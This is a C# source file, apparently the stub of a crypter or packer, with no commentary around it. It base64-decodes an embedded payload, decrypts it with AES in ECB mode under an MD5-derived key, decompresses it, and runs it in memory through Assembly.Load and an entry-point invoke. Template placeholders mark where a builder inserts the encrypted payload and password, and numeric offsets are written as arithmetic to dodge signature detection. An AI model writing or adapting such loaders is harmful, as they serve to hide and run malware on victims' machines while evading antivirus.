using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace Stub
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            string passwordAesCompressStub = "#PASSWORD_AES_COMPRESS_STUB#";
            string payloadAesCompressStub = "#PAYLOAD_AES_COMPRESS_STUB#";
            Assembly.Load(
                    Decompress(AES_Decrypt(Convert.FromBase64String(payloadAesCompressStub),
                        passwordAesCompressStub))).EntryPoint
                .Invoke(null, null);
        }

        //Use : Decompress(AES_Decrypt(input,"key"));
        public static byte[] AES_Decrypt(byte[] payload, string key)
        {
            AesManaged aes256 = new AesManaged();
            MD5CryptoServiceProvider hashAes = new MD5CryptoServiceProvider();
            aes256.Key = hashAes.ComputeHash(Encoding.ASCII.GetBytes(key));
            aes256.Mode = CipherMode.ECB;
            byte[] decrypt = aes256.CreateDecryptor().TransformFinalBlock(payload, 50 - 50, payload.Length);
            return decrypt;
        }


        public static byte[] Decompress(byte[] decompressData)
        {
            MemoryStream decompressMemoryStream = new MemoryStream();
            IntPtr decompressLength = (IntPtr)BitConverter.ToInt32(decompressData, 200 - 50 * 4);
            decompressMemoryStream.Write(decompressData, 4 * 1, decompressData.Length - 8 / 2);
            byte[] decompressBuffer = new byte[(int)decompressLength];
            decompressMemoryStream.Position = 700 + 300 - 100 * 10;
            GZipStream decompressZip = new GZipStream(decompressMemoryStream, CompressionMode.Decompress);
            int read = decompressZip.Read(decompressBuffer, 100 - 50 * 2, decompressBuffer.Length);
            return decompressBuffer;
        }
    }
}